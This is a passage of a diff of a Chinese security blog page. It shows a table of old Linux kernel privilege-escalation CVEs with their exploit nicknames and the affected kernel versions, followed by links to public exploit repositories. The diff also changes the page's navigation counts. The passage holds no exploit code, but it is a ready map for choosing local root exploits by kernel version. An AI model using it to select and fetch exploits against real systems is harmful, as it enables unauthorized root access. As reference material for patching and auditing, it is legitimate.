Privilege Escalation] (before 3.14.8)</span><br><span class="line">CVE-2014-3153 [futex]  (3.3.5 ,3.3.4 ,3.3.2 ,3.2.13 ,3.2.9 ,3.2.1 ,3.1.8 ,3.0.5 ,3.0.4 ,3.0.2 ,3.0.1 ,2.6.39 ,2.6.38 ,2.6.37 ,2.6.35 ,2.6.34 ,2.6.33 ,2.6.32 ,2.6.9 ,2.6.8,2.6.7 ,2.6.6 ,2.6.5 ,2.6.4 ,3.2.2 ,3.0.18 ,3.0 ,2.6.8.1)</span><br><span class="line">CVE-2014-0196 [rawmodePTY] (2.6.31, 2.6.32, 2.6.33, 2.6.34, 2.6.35, 2.6.36, 2.6.37, 2.6.38, 2.6.39, 3.14, 3.15)</span><br><span class="line">CVE-2014-0038 [timeoutpwn] (3.4, 3.5, 3.6, 3.7, 3.8, 3.8.9, 3.9, 3.10, 3.11, 3.12, 3.13, 3.4.0, 3.5.0, 3.6.0, 3.7.0, 3.8.0, 3.8.5, 3.8.6, 3.8.9, 3.9.0, 3.9.6, 3.10.0, 3.10.6, 3.11.0, 3.12.0, 3.13.0, 3.13.1)</span><br><span class="line">CVE-2013-2094 [perf_swevent] (3.0.0, 3.0.1, 3.0.2, 3.0.3, 3.0.4, 3.0.5, 3.0.6, 3.1.0, 3.2, 3.3, 3.4.0, 3.4.1, 3.4.2, 3.4.3, 3.4.4,3.4.5, 3.4.6, 3.4.8, 3.4.9, 3.5, 3.6, 3.7, 3.8.0, 3.8.1, 3.8.2, 3.8.3,3.8.4, 3.8.5, 3.8.6, 3.8.7, 3.8.8, 3.8.9)</span><br><span class="line">CVE-2013-1858 [clown-newuser] (3.3-3.8)</span><br><span class="line">CVE-2013-1763 [__sock_diag_rcv_msg] (before 3.8.3)</span><br><span class="line">CVE-2013-0268 [msr]  (2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26,2.6.27, 2.6.27, 2.6.28,2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34, 2.6.35, 2.6.36, 2.6.37,2.6.38, 2.6.39, 3.0.0,3.0.1, 3.0.2, 3.0.3, 3.0.4, 3.0.5, 3.0.6, 3.1.0, 3.2, 3.3, 3.4, 3.5, 3.6, 3.7.0, 3.7.6)</span><br><span class="line">CVE-2012-3524 [libdbus] (libdbus 1.5.x and earlier)</span><br><span class="line">CVE-2012-0056 [memodipper] (2.6.39, 3.0.0, 3.0.1, 3.0.2, 3.0.3, 3.0.4, 3.0.5, 3.0.6, 3.1.0)</span><br><span class="line">CVE-2010-4347 [american-sign-language] ( 2.6.0, 2.6.1, 2.6.2, 2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9,2.6.10, 2.6.11, 2.6.12, 2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21,2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34, 2.6.35, 2.6.36)</span><br><span class="line">CVE-2010-4258 [full-nelson] (2.6.31, 2.6.32, 2.6.35, 2.6.37)</span><br><span class="line">CVE-2010-4073 [half_nelson] (2.6.0, 2.6.1, 2.6.2, 2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9,2.6.10, 2.6.11, 2.6.12,2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21,2.6.22, 2.6.23, 2.6.24,2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33,2.6.34, 2.6.35, 2.6.36)</span><br><span class="line">CVE-2010-3904 [rds] (2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34, 2.6.35, 2.6.36)</span><br><span class="line">CVE-2010-3437 [pktcdvd] (2.6.0, 2.6.1, 2.6.2, 2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9,2.6.10, 2.6.11, 2.6.12, 2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21,2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34, 2.6.35, 2.6.36)</span><br><span class="line">CVE-2010-3301 [ptrace_kmod2] (2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34)</span><br><span class="line">CVE-2010-3081 [video4linux] (2.6.0, 2.6.1, 2.6.2, 2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9, 2.6.10, 2.6.11, 2.6.12,2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33)</span><br><span class="line">CVE-2010-2959 [can_bcm] (2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34, 2.6.35, 2.6.36)</span><br><span class="line">CVE-2010-1146 [reiserfs] (2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34)</span><br><span class="line">CVE-2010-0415 [do_pages_move] (2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31)</span><br><span class="line">CVE-2009-3547 [pipe.c_32bit] (2.4.4, 2.4.5, 2.4.6, 2.4.7, 2.4.8, 2.4.9, 2.4.10, 2.4.11, 2.4.12, 2.4.13,2.4.14, 2.4.15, 2.4.16, 2.4.17, 2.4.18, 2.4.19, 2.4.20, 2.4.21, 2.4.22, 2.4.23, 2.4.24, 2.4.25,2.4.26, 2.4.27, 2.4.28,2.4.29, 2.4.30, 2.4.31, 2.4.32, 2.4.33, 2.4.34, 2.4.35, 2.4.36, 2.4.37,2.6.15, 2.6.16, 2.6.17,2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26,2.6.27, 2.6.28, 2.6.29,2.6.30, 2.6.31)</span><br><span class="line">CVE-2009-2698 [udp_sendmsg_32bit] (2.6.1, 2.6.2, 2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9, 2.6.10, 2.6.11, 2.6.12, 2.6.13,  2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19)</span><br><span class="line">CVE-2009-2692 [sock_sendpage] (2.4.4, 2.4.5, 2.4.6, 2.4.7, 2.4.8, 2.4.9, 2.4.10, 2.4.11, 2.4.12, 2.4.13,2.4.14, 2.4.15, 2.4.16,2.4.17, 2.4.18, 2.4.19, 2.4.20, 2.4.21, 2.4.22, 2.4.23, 2.4.24, 2.4.25, 2.4.26, 2.4.27, 2.4.28,2.4.29, 2.4.30, 2.4.31, 2.4.32, 2.4.33, 2.4.34, 2.4.35, 2.4.36, 2.4.37,2.6.0, 2.6.1, 2.6.2, 2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9, 2.6.10, 2.6.11, 2.6.12,2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30)</span><br><span class="line">CVE-2009-2692 [sock_sendpage2] (2.4.4, 2.4.5, 2.4.6, 2.4.7, 2.4.8, 2.4.9, 2.4.10, 2.4.11, 2.4.12, 2.4.13, 2.4.14, 2.4.15, 2.4.16, 2.4.17, 2.4.18, 2.4.19, 2.4.20, 2.4.21, 2.4.22, 2.4.23, 2.4.24, 2.4.25,2.4.26, 2.4.27, 2.4.28,2.4.29, 2.4.30, 2.4.31, 2.4.32, 2.4.33, 2.4.34, 2.4.35, 2.4.36, 2.4.37, 2.6.0, 2.6.1, 2.6.2,2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9, 2.6.10, 2.6.11, 2.6.12, 2.6.13, 2.6.14, 2.6.15,2.6.16, 2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24,2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30)</span><br><span class="line">CVE-2009-1337 [exit_notify] (2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29)</span><br><span class="line">CVE-2009-1185 [udev] (2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29)</span><br><span class="line">CVE-2008-4210 [ftrex] (2.6.11, 2.6.12, 2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19,2.6.20, 2.6.21, 2.6.22)</span><br><span class="line">CVE-2008-0600 [vmsplice2] (2.6.23, 2.6.24)</span><br><span class="line">CVE-2008-0600 [vmsplice1] (2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.24.1)</span><br><span class="line">CVE-2006-3626 [h00lyshit] (2.6.8, 2.6.10, 2.6.11, 2.6.12, 2.6.13, 2.6.14, 2.6.15, 2.6.16)</span><br><span class="line">CVE-2006-2451 [raptor_prctl] (2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17)</span><br><span class="line">CVE-2005-0736 [krad3] (2.6.5, 2.6.7, 2.6.8, 2.6.9, 2.6.10, 2.6.11)</span><br><span class="line">CVE-2005-1263 [binfmt_elf.c] (Linux kernel 2.x.x to 2.2.27-rc2, 2.4.x to 2.4.31-pre1, and 2.6.x to 2.6.12-rc4)</span><br><span class="line">CVE-2004-1235 [elflbl] (2.4.29)</span><br><span class="line">CVE-N/A [caps_to_root]  (2.6.34, 2.6.35, 2.6.36)</span><br><span class="line">CVE-2004-0077 [mremap_pte] (2.4.20, 2.2.24, 2.4.25, 2.4.26, 2.4.27)</span><br></pre></td></tr></table></figure>
-<p>已对外公开exp注：</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/SecWiki/linux-kernel-exploits">https://github.com/SecWiki/linux-kernel-exploits</a></p>
-<p><a target="_blank" rel="noopener" href="https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack/">https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack/</a></p>
-<p><a target="_blank" rel="noopener" href="https://github.com/xairy/kernel-exploits">https://github.com/xairy/kernel-exploits</a></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/11/">11</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
   </nav>
 
 
@@ -597,7 +591,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">49</span>
+          <span class="site-state-item-count">52</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
